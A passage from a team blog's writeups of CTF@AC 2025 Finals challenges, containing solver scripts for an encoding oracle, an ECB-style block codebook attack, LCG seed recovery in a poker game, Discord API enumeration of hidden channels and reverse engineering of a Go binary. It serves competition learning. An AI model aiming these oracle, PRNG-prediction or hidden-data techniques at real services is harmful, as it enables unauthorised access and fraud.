collecting any hits that match tokens seen on /flag.\nThe allowed alphabet is 39 symbols (26 letters + 10 digits + {, }, _).\nSolution So, the strategy is to fetch the ordered token sequence from /flag, then repeatedly send ch * N for each allowed character to /encode, recording any returned token that also appears on /flag. When every /flag token has a mapped character, reconstruct the flag by substitution in order. In practice, repeating a character coaxes out multiple token variants.\nScript import time import random import string from typing import Dict, List import requests import bs4 BASE_URL = 'http://168908dd.ctf.ac.upt.ro' ROUNDS = 60 REPEATS = 10 SLEEP = 0 CHARSET = string.ascii_uppercase + string.digits + '{}_' FIELD_NAME = 'text' session = requests.Session() session.headers.update({'User-Agent': 'simple-encoder-solver/1.0'}) def parse_tokens(html: str) -\u003e List[str]: soup = bs4.BeautifulSoup(html, 'html.parser') div = soup.find('div', class_='encoded') if not div: return [] return [el.get_text(strip=True) for el in div.find_all() if el.get_text(strip=True)] def get_flag_tokens() -\u003e List[str]: r = session.get(BASE_URL + '/flag', timeout=15) r.raise_for_status() return parse_tokens(r.text) def encode(text: str) -\u003e List[str]: r = session.post(BASE_URL + '/encode', data={FIELD_NAME: text}, timeout=15) r.raise_for_status() return parse_tokens(r.text) def solve() -\u003e str: flag_tokens = get_flag_tokens() if not flag_tokens: raise RuntimeError('No tokens returned from /flag') needed = set(flag_tokens) mapping: Dict[str, str] = {} for _ in range(ROUNDS): chars = list(CHARSET) random.shuffle(chars) for ch in chars: try: tokens = encode(ch * REPEATS) except Exception: continue for t in tokens: if t in needed and t not in mapping: mapping[t] = ch if SLEEP: time.sleep(SLEEP) if len(mapping) == len(needed): break decoded = ''.join(mapping.get(t, '?') for t in flag_tokens) print(f\"Mapped {len(mapping)}/{len(needed)} tokens\") return decoded if __name__ == '__main__': print(solve()) Rule of X Analysis The challenge is a service where we can do two things:\nEncrypt a story that contains the flag Encrypt a plaintext of our choice Welcome to The Dream of Poliphilus! 1. Get a story and a flag 2. Encrypt plaintext \u003e By encrypting some plaintexts, I found that a 4-byte block always maps to another 4-byte block (ECB-like).\n\u003e aaaa1 Ciphertext: 46d08e66 948d0fbf \u003e aaaa Ciphertext: 46d08e66 31a3a187 \u003e 1 Ciphertext: 948d0fbf Solution Given that a 4-byte block always maps to another 4-byte block, to decrypt the whole text we would need to send every possible combination of 4 characters to be encrypted‚Ä¶ or would we?\nIn fact, we don‚Äôt care about the entire text, we just need the flag. Knowing the flag format (CTF{hexvalues}), we can narrow down the alphabet to encrypt.\nSo we arrive at this solution:\nfrom itertools import product from pwn import * from tqdm import trange context.log_level = 'critical' alphabet = 'CTF{}' + '0123456789abcdef' combs = product(alphabet, repeat=4) payload = ''.join([''.join(c) for c in combs]) output = '' blocks = [payload[i:i+4] for i in range(0, len(payload), 4)] for i in trange(0, len(blocks), 100): r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ',''.join(blocks[i:i+100]).encode()) r.recvline() output += r.recvline().strip().decode()[:-8] r.close() mappings = {} assert len(output) % 8 == 0, \"Encrypted output length should be a multiple of 8\" for i in range(0, len(output), 8): enc_chunk = output[i:i+8] # 8-byte ciphertext block plain_idx = i // 2 # maps to corresponding 4-byte plaintext start plain_chunk = payload[plain_idx:plain_idx+4] mappings[enc_chunk] = plain_chunk r.close() r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'1') r.recvline() flag_enc = r.recvline().strip().decode() r.close() assert len(flag_enc) % 8 == 0, \"Encrypted flag length should be a multiple of 8\" decoded_blocks = [] for i in range(0, len(flag_enc), 8): c = flag_enc[i:i+8] decoded_blocks.append(mappings.get(c, '????')) flag_dec = ''.join(decoded_blocks) print(f'Flag: {flag_dec}') But there‚Äôs a problem: this code can‚Äôt extract the whole flag. The output is:\n????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????F{0b3d4dd2dfa538c778f815b824da290e60ebc6d6116fcb94acc76a232fe811???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? We can spot the start ‚ÄòF{‚Ä¶‚Äô and prepend ‚ÄòCT‚Äô, but how do we get the last block?\nConsider what the last block contains: 4 characters, the first two are hex digits, then a closing curly bracket, and a random character (that‚Äôs why the first script couldn‚Äôt decode everything).\nBased on this, we can brute-force the two hex characters and the last character, thus extracting the final flag block.\nfor tup in trange(255): for i in trange(255): if not chr(i).isprintable(): continue brute = f\"{tup:02x}\" + \"}\" + chr(i) r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ', brute.encode()) r.recvline() output = r.recvline().strip().decode() r.close() if output[:8] in flag_enc: print(f\"Found matching plaintext: {brute}\") exit(0) else: if tup == 0: print(output[:8]) else: print(\"No matching 4-byte plaintext found in given alphabet.\") Which outputs -\u003e e7}H\nScript from itertools import product from pwn import * from tqdm import trange context.log_level = 'critical' alphabet = 'CTF{}' + '0123456789abcdef' combs = product(alphabet, repeat=4) payload = ''.join([''.join(c) for c in combs]) output = '' blocks = [payload[i:i+4] for i in range(0, len(payload), 4)] for i in trange(0, len(blocks), 100): r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ',''.join(blocks[i:i+100]).encode()) r.recvline() output += r.recvline().strip().decode()[:-8] r.close() mappings = {} assert len(output) % 8 == 0, \"Encrypted output length should be a multiple of 8\" for i in range(0, len(output), 8): enc_chunk = output[i:i+8] # 8-byte ciphertext block plain_idx = i // 2 # maps to corresponding 4-byte plaintext start plain_chunk = payload[plain_idx:plain_idx+4] mappings[enc_chunk] = plain_chunk r.close() r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'1') r.recvline() flag_enc = r.recvline().strip().decode() r.close() assert len(flag_enc) % 8 == 0, \"Encrypted flag length should be a multiple of 8\" decoded_blocks = [] for i in range(0, len(flag_enc), 8): c = flag_enc[i:i+8] decoded_blocks.append(mappings.get(c, '????')) flag_dec = ''.join(decoded_blocks) print(f'Flag: {flag_dec}') with open('flag.txt', 'w') as f: f.write(flag_dec + '\\n') for tup in trange(255): for i in trange(255): if not chr(i).isprintable(): continue brute = f\"{tup:02x}\" + \"}\" + chr(i) r = remote('28267ab8.ctf.ac.upt.ro', 9323) r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'\u003e ', brute.encode()) r.recvline() output = r.recvline().strip().decode() r.close() if output[:8] in flag_enc: print(f\"Found matching plaintext: {brute}\") exit(0) else: if tup == 0: print(output[:8]) else: print(\"No matching 4-byte plaintext found in given alphabet.\") Miscellaneous üêß Full-House Poker Analysis The remote poker game shuffles the deck using a non-cryptographic linear congruential generator (LCG) with a 24‚Äëbit seed and Fisher‚ÄìYates. By folding a few rounds to collect consecutive player hands, we can recover the seed (via a small time-window search or full 2^24 brute-force), reproduce future shuffles, and bet only when our predicted hand strictly beats the dealer. Beating the dealer 30 time gets the flag.\nPRNG: LCG with parameters A=1103515245, C=12345, M=2^31, seed truncated to 24 bits. Shuffle: Fisher Yates, advancing the PRNG once per swap (51 draws per round). Observation: Player receives the first 5 cards of the shuffled deck; dealer receives the next 5. Attack: Collect 4 consecutive hands while folding; recover seed; predict all future rounds; bet only on guaranteed wins; reach streak 30. Solution Data collection ‚Äì\u003e folding: Read the ASCII cards for 4 consecutive rounds (HAND_SAMPLES = 4). Always send f (fold) during this phase. This preserves the streak and ensures one shuffle per round without extra PRNG usage. Recover the seed: Time-windowed search: the seed is derived created using time.time() modulo 2^24, I assumed the timestamp reflects the time at which I connected to the service. Start from now \u0026 0xFFFFFF and try radii 10m, 1h, 6h, 24h (~600, ~3600, ~21600, ~86400 seconds). For each candidate seed, simulate HAND_SAMPLES shuffles and check that the top 5 cards match the observed player hands. Full brute-force fallback: if the time-window search fails, scan the entire 24-bit space (~16.7M seeds). This is still feasible with efficient Python and early rejection. Predict and win: After recovering the seed, fast-forward the PRNG by performing HAND_SAMPLES shuffles to sync with the upcoming round. For each future round: Simulate the next shuffle and extract the player‚Äôs and dealer‚Äôs 5-card hands (positions 0..4 and 5..9 of the shuffled deck). Evaluate both hands using the same ranking as the server and compare. Bet only if the player‚Äôs hand strictly beats the dealer‚Äôs; otherwise fold. Repeat until streak reaches 30; the server prints the flag. Script from pwn import remote, context import re import sys import time context.log_level = 'info' HOST = '?' PORT = ? MAX_SEED = 0xFFFFFF # 24-bit HAND_SAMPLES = 4 # number of initial hands to collect for seed filtering RANK_ORDER = ['2','3','4','5','6','7','8','9','T','J','Q','K','A'] SUITS = ['‚ô†','‚ô•','‚ô¶','‚ô£'] RANK_VALUE = {r: i+2 for i, r in enumerate(RANK_ORDER)} # Build canonical ordered deck def build_deck(): return [(r,s) for r in RANK_ORDER for s in SUITS] # LCG parameters (mod 2^31) A = 1103515245 C = 12345 M = 1 \u003c\u003c 31 def lcg_next(state): return (A * state + C) \u0026 0x7fffffff # Apply Fisher-Yates using LCG state; returns new state after 51 draws and deck def shuffle_with_state(state): deck = build_deck() for i in range(len(deck)-1, 0, -1): state = lcg_next(state) j = state % (i+1) deck[i], deck[j] = deck[j], deck[i] return state, deck # Hand evaluation (same tuples ordering as server) def hand_strength(cards): ranks = sorted([RANK_VALUE[r] for (r, s) in cards], reverse=True) suits = [s for (r,s) in cards] counts = {} for rv in ranks: counts[rv] = counts.get(rv,0)+1 by_count_then_rank = sorted(counts.items(), key=lambda kv: (kv[1], kv[0]), reverse=True) is_flush = len(set(suits)) == 1 sorted_unique_desc = sorted(set(ranks), reverse=True) is_straight = False straight_high = None if len(sorted_unique_desc) == 5: top = sorted_unique_desc[0] if sorted_unique_desc == list(range(top, top-5, -1)): is_straight = True straight_high = top else: wheel = [14,5,4,3,2] if sorted_unique_desc == wheel: is_straight = True straight_high = 5 counts_sorted = [c for (_,c) in by_count_then_rank] ranks_sorted_by_count = [r for (r,_) in by_count_then_rank] if counts_sorted[0] == 4: return (7, ranks_sorted_by_count[0], ranks_sorted_by_count[1]) if counts_sorted[0] == 3 and counts_sorted[1] == 2: return (6, ranks_sorted_by_count[0], ranks_sorted_by_count[1]) if is_flush and is_straight: return (8, straight_high) if is_flush: return (5, sorted(ranks, reverse=True)) if is_straight: return (4, straight_high) if counts_sorted[0] == 3: trips_rank = ranks_sorted_by_count[0] kickers = sorted([r for r in ranks if r != trips_rank], reverse=True) return (3, trips_rank, kickers) if counts_sorted[0] == 2 and counts_sorted[1] == 2: high_pair = max(ranks_sorted_by_count[0], ranks_sorted_by_count[1]) low_pair = min(ranks_sorted_by_count[0], ranks_sorted_by_count[1]) kicker = [r for r in ranks if r != high_pair and r != low_pair][0] return (2, high_pair, low_pair, kicker) if counts_sorted[0] == 2: pair_rank = ranks_sorted_by_count[0] kickers = sorted([r for r in ranks if r != pair_rank], reverse=True) return (1, pair_rank, kickers) return (0, sorted(ranks, reverse=True)) def compare_hands(p1, p2): s1 = hand_strength(p1) s2 = hand_strength(p2) return (s1 \u003e s2) - (s1 \u003c s2) CARD_WIDTH = 7 CARD_LINES = 7 def parse_hand(block): lines = block.strip('\\n').split('\\n') # Expect 7 lines of cards if len(lines) \u003c CARD_LINES: raise ValueError('Unexpected hand block lines') line1 = lines[1] # second line (index 1) line3 = lines[3] # fourth line (index 3) parts1 = line1.split(' ') # cards separated by space parts3 = line3.split(' ') cards = [] card_regex_rank = re.compile(r'‚îÇ(.{1,2})\\s{3}‚îÇ') card_regex_suit = re.compile(r'‚îÇ\\s{2}(.)\\s{2}‚îÇ') ranks = card_regex_rank.findall(line1) suits = card_regex_suit.findall(line3) if len(ranks) != len(suits): raise ValueError('Rank/suit count mismatch') for r,s in zip(ranks,suits): cards.append((r.strip(), s)) return cards HAND_HEADER = 'Your hand:' def recv_until_hand(io): data = b'' while True: chunk = io.recvuntil(b'Action? [b]et / [f]old \u003e ', timeout=5) data += chunk text = data.decode(errors='ignore') # Extract portion between 'Your hand:' and the prompt if HAND_HEADER in text: # Get last occurrence idx = text.rfind(HAND_HEADER) after = text[idx+len(HAND_HEADER):] top_idx = after.find('‚îå') if top_idx == -1: continue hand_block = after[top_idx:] if 'Action? [b]et / [f]old \u003e' in hand_block: hand_block = hand_block.split('Action? [b]et / [f]old \u003e')[0] # Keep exactly 7 lines lines = hand_block.split('\\n')[:CARD_LINES] hand_ascii = '\\n'.join(lines) try: return parse_hand(hand_ascii) except Exception as e: context.log_level='debug' print('Parse error, retry:', e) context.log_level='info' # else keep waiting def recover_seed(hands): candidates = [] for seed in range(MAX_SEED+1): state = seed \u0026 0xffffffff ok = True for target in hands: state, deck = shuffle_with_state(state) if deck[:5] != target: ok = False break if ok: candidates.append(seed) if len(candidates) == 1: break # assume unique return candidates[0] if candidates else None def recover_seed_time_window(hands, center, radius): total = 2*radius + 1 for off in range(-radius, radius+1): seed = (center + off) \u0026 0xFFFFFF state = seed \u0026 0xffffffff ok = True for target in hands: state, deck = shuffle_with_state(state) if deck[:5] != target: ok = False break if ok: return seed return None def predict_next(state): state, deck = shuffle_with_state(state) player = deck[:5] dealer = deck[5:10] return state, player, dealer def main(): io = remote(HOST, PORT) collected = [] for i in range(HAND_SAMPLES): hand = recv_until_hand(io) print(f'[+] Round {i} observed player hand: {hand}') collected.append(hand) io.sendline(b'f') # fold to preserve streak now_seed = int(time.time()) \u0026 0xFFFFFF windows = [600, 3600, 6*3600, 24*3600] # 10m, 1h, 6h, 24h seed = None start = time.time() for rad in windows: print(f'[*] Trying seed window +/-{rad}s around 0x{now_seed:06x}...') seed = recover_seed_time_window(collected, now_seed, rad) if seed is not None: break if seed is None: print('[*] Falling back to full 2^24 brute force; this may take time') seed = recover_seed(collected) elapsed = time.time() - start if seed is None: print('[-] Seed not found') io.interactive() return print(f'[+] Seed recovered: 0x{seed:06x} in {elapsed:.2f}s') state = seed \u0026 0xffffffff for _ in range(HAND_SAMPLES): state, _deck = shuffle_with_state(state) streak = 0 target_streak = 30 round_idx = HAND_SAMPLES while streak \u003c target_streak: state, predicted_player, predicted_dealer = predict_next(state) result = compare_hands(predicted_player, predicted_dealer) action = 'b' if result \u003e 0 else 'f' print(f'[+] Predict round {round_idx}: player={predicted_player} dealer={predicted_dealer} -\u003e result={result} action={action}') # Receive actual round hand actual = recv_until_hand(io) if actual != predicted_player: print('[-] Mismatch in prediction, abort.') io.interactive() return io.sendline(action.encode()) if action == 'b': streak += 1 print(f'[+] Current streak: {streak}') round_idx += 1 io.interactive() if __name__ == '__main__': main() Grass-Guesser Analysis The challenge was a funny ‚Äúgeoguesser‚Äù game where, from a simple grass image, you needed to find where that grass was in the world. This would be impossible if it wasn‚Äôt for the fact that the website, every time you got your answer wrong, told you how far you were from the real point and appended the name of the city or park that was involved.\nFinding the coordinates It was possible (as I did) to search the approximate coordinates of the place that the site was responding with and then try to adjust them in a way that the site liked better.\nSolution The solution is as simple as it seems; the only challenge was finding every single coordinate, which could probably be scripted, but I decided to do it myself.\nAfter I was able to get every coordinate, I just sent them one by one to the server and get the flag CTF{53575e231bf06ed00182dcc71ef0e5d1b7d6da577d04ea08add31d8fbfd53722}\nScript This is the actual script used in order to retrieve the flag from the remote\nimport requests, json url = '?' s = requests.Session() r = s.post(url+'api/start') sessId = json.loads(r.text)['sessionId'] lats = [51.5074,48.8566,40.7829,-33.8688,35.6762,52.5200,41.8902,37.7750,55.7558,1.2897] longs = [-0.1278,2.3521,-73.9654,151.2093,139.6503,13.4051,12.4923,-122.4194,37.6173,103.8501] for i in range(10): r = s.post(url+'api/guess', json={'sessionId': sessId, 'lat': lats[i%len(lats)], 'lng': longs[i%len(longs)]}) print(json.loads(r.text)['flag']) Discord Sanity Check Analysis The challenge didn‚Äôt provide any kind of attachments and the only hint was its description:\nHope you liked our original discord challenge. Now we have a better one :D\nObviusly the only discord server that had to be analyzed was the CTFs one that had the guild id 1358683641097621596.\nOnce done that the flow to find the flag was easy and followed this steps:\nOpen discord browser and get in the right server Edit using burp / firefox developer network manager an API request. Once done that I could effectevly analyse the server since I guessed that there weren‚Äôt any kind of interaction necessary to find the flag. Thus I opened the discord API references and started analyzing the guild.\nMake an API request to https://discord.com/api/v9/guilds/1358683641097621596, here I found nothing really interesting a side from some roles I haven‚Äôt seen before. Make an API request to see all the channels (some of them might be hidden but still share some kind of information, that‚Äôs how discord work according to some documents online) https://discord.com/api/v9/guilds/1358683641097621596/channels Using the last request I was able to find the flag hidden in the topic of a private channel Stairway To Heaven Analysis The challenge literally told everyone that a staircase in the venue had some ‚Äúpiece of cloth‚Äù atteched to, we wondered around for a minute and then right after find this flag.\nLove at first bit Analysis Aside from yapping for quite a long time about a story, the challenge asked to find where this photo was taken:\nThis was a strange question for a misc challenge, especially because the description itself didn‚Äôt provide any useful data to find the location.\nThus we treated the image as a steganography challenge and analyzed it using aperisolve.\nWe found the flag in the zsteg analysis as b1,rgb,lsb,xy.\nWith that, we solved the challenge and obtained the flag CTF{Palazzo Falson}.\nReverse engineering ‚öôÔ∏è Minecrafty as a Service Analysis The attachment main.wasm is a Minecraft server compiled to WebAssembly (WASM). After joining the server, we can see two available commands: !help and !flag. When running !flag, the server replies with something like: To get the flag, run this command at position UwU. This implies we must find the exact position at which to run !flag, as defined in main.wasm.\nTo locate the handler for the command, I searched for a function with chat in its name. I found github.com_go_mc_server_game.__globalChat_.Handle, which at address 0x808c1d77 contains the handler for the !flag command. Analyzing this handler shows that the player‚Äôs current position must be exactly (35246, 35246, 35246) for the flag to be printed.\n// After matching \"!flag\" int X = (int) truncS(player.posX); int Y = (int) truncS(player.posY); int Z = (int) truncS(player.posZ); // 0x89ae == 35246 if (X != 0x89ae) goto fail; if (Y != 0x89ae) goto fail; if (Z == 0x89ae) goto success; // all three must be 35246 else goto fail; Solution Knowing this, we need to move to the coordinates (35246, 35246, 35246). To do that, I reused the solution from the Minecraft challenge in the quals and changed the target position.\nScript #!/usr/bin/env node const mineflayer = require('mineflayer') const { Vec3 } = require('vec3') function parseArgs () { const args = { host: '127.0.0.1', port: 25565, name: 'Flaggy', version: '1.19.4' } for (let i = 2; i \u003c process.argv.length; i++) { const a = process.argv[i] if (a === '--host') args.host = process.argv[++i] else if (a === '--port') args.port = parseInt(process.argv[++i], 10) else if (a === '--name') args.name = process.argv[++i] else if (a === '--version') args.version = process.argv[++i] } return args } const TARGET = new Vec3(35246, 35246, 35246) const MAX_STEP = 50 function stepTowards (cur, dst, maxStep) { const dx = dst.x - cur.x const dy = dst.y - cur.y const dz = dst.z - cur.z const dist = Math.sqrt(dx * dx + dy * dy + dz * dz) if (dist === 0) return cur if (dist \u003c= maxStep) return new Vec3(dst.x, dst.y, dst.z) const s = maxStep / dist return new Vec3(cur.x + dx * s, cur.y + dy * s, cur.z + dz * s) } async function main () { const { host, port, name, version } = parseArgs() console.log('[INIT] Config:', { host, port, name, version }) const createOpts = { host, port, username: name, auth: 'offline' } if (version \u0026\u0026 version.toLowerCase() !== 'auto') createOpts.version = version else console.log('[INIT] Version: auto') const bot = mineflayer.createBot(createOpts) bot.once('login', () =\u003e { console.log('[STATE] Logged in, waiting for spawn...') }) bot.once('kicked', (reason) =\u003e { console.error('[STATE] Kicked:', reason?.toString?.() || reason) }) bot.once('error', (err) =\u003e { console.error('[STATE] Error:', err) }) bot.once('end', () =\u003e { console.log('[STATE] Disconnected') }) bot.on('message', (cm) =\u003e { try { const s = cm.toString() console.log('[CHAT]', s) if (s.includes('ctf{')) { console.log(s) bot.end() process.exit(0) } } catch (_) {} }) let movementStarted = false let movementState = null let teleportReady = true function startMovement (reason) { if (movementStarted) return movementStarted = true const start = bot.entity.position.clone() console.log(`[STATE] Starting movement (${reason}) at`, { x: start.x.toFixed(2), y: start.y.toFixed(2), z: start.z.toFixed(2) }) if (bot.creative \u0026\u0026 bot.creative.startFlying) { try { bot.creative.startFlying(); console.log('[ACTION] Start flying') } catch (_) {} } let cur = start let moving = true let stepCount = 0 const interval = 200 const dist = (a, b) =\u003e Math.sqrt((a.x - b.x) ** 2 + (a.y - b.y) ** 2 + (a.z - b.z) ** 2) console.log('[MOVE] Target:', { x: TARGET.x, y: TARGET.y, z: TARGET.z }) console.log('[MOVE] Initial distance:', dist(cur, TARGET).toFixed(2), 'blocks') movementState = { cur, moving, stepCount, interval } const timer = setInterval(() =\u003e { if (!movementState.moving) return const next = stepTowards(movementState.cur, TARGET, MAX_STEP) const stepLen = dist(movementState.cur, next) const remainBefore = dist(movementState.cur, TARGET) movementState.cur = next movementState.stepCount++ console.log(`[MOVE] step ${movementState.stepCount} -\u003e (${next.x.toFixed(2)}, ${next.y.toFixed(2)}, ${next.z.toFixed(2)}) ` + `(step=${stepLen.toFixed(2)} rem=${Math.max(0, remainBefore - stepLen).toFixed(2)})`) try { bot._client.write('position', { x: next.x, y: next.y, z: next.z, onGround: true }) } catch (e1) { try { bot._client.write('position_look', { x: next.x, y: next.y, z: next.z, yaw: 0, pitch: 0, onGround: true }) } catch (e2) { console.error('[NET] Move send failed:', e2?.message || e2) } } if (next.equals(TARGET)) { movementState.moving = false clearInterval(timer) console.log('[MOVE] Arrived at target. Requesting flag...') setTimeout(() =\u003e { console.log('[CHAT] \u003e\u003e !flag') bot.chat('!flag') }, 500) } }, interval) } bot.once('spawn', () =\u003e startMovement('spawn')) bot.once('login', () =\u003e { setTimeout(() =\u003e { if (!movementStarted) { console.log('[WARN] Spawn not seen after 5s; starting anyway...') startMovement('timeout') } }, 5000) }) let debugCount = 0 bot._client.on('packet', (data, meta) =\u003e { if (debugCount \u003c 10) { console.log('[PKT]', meta.name) debugCount++ } if (meta.name === 'player_position_and_look' || meta.name === 'position' || meta.name === 'position_look' || meta.name === 'player_position') { const hasTeleportId = typeof data.teleportId === 'number' if (hasTeleportId) { try { bot._client.write('teleport_confirm', { teleportId: data.teleportId }) console.log('[NET] Confirmed teleport id', data.teleportId) } catch (e) { console.log('[NET] Teleport confirm write failed:', e?.message || e) } teleportReady = true } const hasXYZ = typeof data.x === 'number' \u0026\u0026 typeof data.y === 'number' \u0026\u0026 typeof data.z === 'number' if (hasXYZ \u0026\u0026 movementState) { movementState.cur = new Vec3(data.x, data.y, data.z) console.log('[SYNC] Cur pos updated from server packet') } if (!movementStarted) startMovement('server-position') } }) } main().catch((e) =\u003e { console.error(e) process.exit(1) }) N.B.: This exploit is practically the same of the original Minecrafty\nVolatile Analysis While analyzing the file I understood that this was a binary written in GO where the function main.main at 0x5309e0 builded an afero.MemMapFs over an embedded file table and reading two paths (unk_5BCEE4 -\u003e e/f1, unk_5BCEE8 -\u003e e/f2) via github_com_spf13_afero_ReadFile. The table itself is a []internal/embed/file slice at 0x604360, whose header (ptr=0x604378, len=3) points at three entries: directory e/, and files e/f1 and e/f2. Each entry stores the Go string pointer/length for both the path and the file data, so dumping the strings at those addresses recovers the payloads. e/f1 turned out to be the literal 32-byte ASCII string 6b90408b52818c16e4e3fd2e8acb40d6, while e/f2 held a 128-byte base64 ciphertext beginning with RLJwwmLd1PETlctb...PlPGI.\nWhile continuing to analyze the main.main function I understood that it called encoding/base64.StdEncoding.DecodeString on e/f2, taking the first 16 decoded bytes as an IV, and decrypting the remainder with crypto/aes.NewCipher + cipher.NewCBCDecrypter using the raw bytes from e/f1. The plaintext was then written to /uwu/flag.txt, so recreating that routine offline reproduces the flag without needing to run the target binary.\nSolution I used extract_embed_fs.py to parse the slice at 0x604360 and dump extracted/e/f1 and extracted/e/f2 straight from .rodata. The script converts the virtual addresses to file offsets using the .rodata base (0x56b000) observed in IDA, so no manual hex-editing is required: cd Downloads python extract_embed_fs.py I decrypted e/f2 with the AES-CBC flow mirrored from main.main. decrypt_flag.py base64-decodes the blob, splits IV+ciphertext, decrypts, PKCS#7-unpads, prints the plaintext, and drops it where the binary would have been (uwu/flag.txt): python decrypt_flag.py Thus providing the right flag as the binary would have.\nScripts Extract Embed FS #!/usr/bin/env python3 from __future__ import annotations import argparse import struct from pathlib import Path RODATA_VADDR = 0x56B000 RODATA_FOFFSET = 0x16B000 FILE_SLICE_ADDR = 0x604360 FILE_ENTRY_SIZE = 48 # sizeof(string) + sizeof(string) + 16-byte hash def vaddr_to_offset(vaddr: int) -\u003e int: if vaddr \u003c RODATA_VADDR: raise ValueError(f\"virtual address 0x{vaddr:x} is outside .rodata\") return RODATA_FOFFSET + (vaddr - RODATA_VADDR) def read_slice_header(blob: bytes) -\u003e tuple[int, int, int]: if len(blob) != 24: raise ValueError(\"expected 24-byte slice header\") return struct.unpack(\"",
  "wordCount" : "9950",
  "inLanguage": "en",
  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io","datePublished": "2025-11-09T00:00:00Z",
  "dateModified": "2025-11-09T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Paolo"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://pascalctf.github.io/en/ctf/ctfatac2025_finals/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Paolo",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pascalctf.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://pascalctf.github.io/en/" accesskey="h" title="Home (Alt + H)">
                <img src="https://pascalctf.github.io/favicon.ico" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="https://pascalctf.github.io/it/" title="Italian"
                            aria-label=":it: It">üáÆüáπ It</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://pascalctf.github.io/en/projects/" title="üìí Projects">
                    <span>üìí Projects</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/en/ctf/" title="‚öô Writeups">
                    <span>‚öô Writeups</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/en/competitions/" title="üèÜ Competitions">
                    <span>üèÜ Competitions</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/en/sponsors/" title="üöÄ Sponsors">
                    <span>üöÄ Sponsors</span>
                </a>
            </li>
            <li>
                <a href="https://wiki.pascalctf.it/" title="üè† Wiki">
                    <span>üè† Wiki</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://pascalctf.github.io/en/">Home</a>&nbsp;¬ª&nbsp;<a href="https://pascalctf.github.io/en/ctf/">Capture The Flag üö©</a></div>
    <h1 class="post-title entry-hint-parent">
      CTF@AC 2025 Finals
    </h1>
    <div class="post-description">
      All the writeups of the CTF@AC Finals ctf 2025 edition.
    </div>
    <div class="post-meta"><span title='2025-11-09 00:00:00 +0000 UTC'>November 9, 2025</span>&nbsp;¬∑&nbsp;47 min&nbsp;¬∑&nbsp;9950 words&nbsp;¬∑&nbsp;Paolo&nbsp;|&nbsp;Translations:
<ul class="i18n_list">
    <li>
        <a href="https://pascalctf.github.io/it/ctf/ctfatac2025_finals/">üáÆüáπ It</a>
    </li>
</ul>&nbsp;|&nbsp;<a href="https://github.com/PascalCTF/PascalCTF.github.io/blob/main/content/en/ctf/ctfatac2025_finals.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
